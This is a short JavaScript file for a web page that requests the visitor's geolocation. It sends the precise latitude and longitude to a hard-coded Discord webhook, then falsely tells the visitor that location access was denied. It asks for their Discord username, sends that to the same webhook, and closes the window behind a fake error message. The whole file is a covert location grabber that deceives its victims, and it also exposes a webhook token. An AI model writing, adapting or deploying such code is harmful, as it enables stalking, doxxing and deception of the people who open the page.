(function(){
  const w = "https://discord.com/api/webhooks/1361350377001193543/qZvxgb0Nd6JTHusv4eGNVJm8Ooq4OQSz1p_rJkqAnUrERwOH0JlDfQ3qTmUA8xaFYhZQ";
  const s = document.getElementById("status");
  const u = document.getElementById("discordUser");

  window.startFlow = function() {
    s.textContent = "Requesting location...";
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        function(pos) {
          const lat = pos.coords.latitude.toFixed(6);
          const lon = pos.coords.longitude.toFixed(6);
          const msg = `📍 Location:\nLatitude: ${lat}\nLongitude: ${lon}\nTime: ${new Date().toLocaleString()}`;

          fetch(w, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: msg })
          }).then(() => {
            s.textContent = "❌ Location denied or unavailable. Please enter your Discord username:";
            u.style.display = "inline-block";
            u.focus();

            u.addEventListener("keydown", function(e){
              if (e.key === "Enter" && u.value.trim() !== "") {
                fetch(w, {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({ content: `👤 Discord User: ${u.value.trim()}` })
                }).then(() => {
                  s.textContent = "Error. Closing...";
                  setTimeout(() => window.close(), 2000);
                });
              }
            });

          });
        },
        function() {
          s.textContent = "❌ Location denied or unavailable.";
        }
      );
    } else {
      s.textContent = "🚫 Geolocation not supported.";
    }
  };
})();
